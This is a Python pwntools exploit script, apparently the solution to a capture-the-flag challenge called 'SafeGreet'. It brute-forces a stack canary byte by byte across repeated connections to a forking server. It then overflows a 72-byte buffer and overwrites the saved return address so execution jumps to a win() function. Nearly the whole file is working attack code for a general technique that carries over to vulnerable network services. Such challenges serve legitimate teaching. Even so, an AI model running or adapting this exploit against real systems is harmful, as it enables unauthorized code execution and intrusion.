#!/usr/bin/env python3
"""
SafeGreet — Canary Brute-Force Exploit
Usage:
    python3 solve.py [HOST [PORT]]
    (defaults to localhost:4445)

Attack:
  1. BUF_OFFSET=72  → buffer fills to canary position
  2. Canary byte 0 is always 0x00 on x86-64 (no-guess)
  3. Brute force bytes 1-7 (up to 7×256 = 1792 reconnects)
  4. Build final payload: fill + canary + junk_rbp + win()
"""

import sys as _sys; _argv = _sys.argv[:]  # capture before pwntools import
from pwn import *

HOST = _argv[1] if len(_argv) > 1 else '127.0.0.1'
PORT = int(_argv[2]) if len(_argv) > 2 else 4445

context.log_level = 'warning'

# ── known values ───────────────────────────────────────────────────────────────
BUF_TO_CANARY = 72          # buf[64] + 8-byte compiler alignment padding
WIN           = 0x401226    # win() address (no PIE → fixed)

def try_byte(known: bytes, guess: int) -> bool:
    """
    Send 'BUF_TO_CANARY + known + guess' bytes.
    If the server replies with 'Goodbye!' → guess is correct.
    If connection closes before 'Goodbye!' → wrong byte (stack check failed).
    """
    try:
        p = remote(HOST, PORT, timeout=3)
        p.recvuntil(b'Name: ', timeout=3)
        payload = b'A' * BUF_TO_CANARY + known + bytes([guess])
        p.send(payload)
        resp = p.recvall(timeout=1.5)
        p.close()
        return b'Goodbye!' in resp
    except Exception:
        return False

# ── Step 1: brute-force canary ─────────────────────────────────────────────────
log.info("Brute-forcing stack canary...")
canary = b'\x00'            # byte 0 is always null

for i in range(1, 8):
    found = False
    for b in range(256):
        if try_byte(canary, b):
            canary += bytes([b])
            log.success(f"  canary[{i}] = 0x{b:02x}  ({i}/7 done)")
            found = True
            break
    if not found:
        log.error(f"Failed to find canary byte {i}. Exiting.")
        sys.exit(1)

log.success(f"Full canary: {canary.hex()}")

# ── Step 2: send final payload ─────────────────────────────────────────────────
log.info("Sending final payload...")

p = remote(HOST, PORT, timeout=5)
p.recvuntil(b'Name: ', timeout=5)

payload  = b'A' * BUF_TO_CANARY   # fill to canary
payload += canary                   # correct 8-byte canary
payload += b'B' * 8                # overwrite saved RBP (don't care)
payload += p64(WIN)                 # overwrite saved RIP → win()

p.send(payload)
result = p.recvall(timeout=3)
print(result.decode(errors='replace'))
p.close()
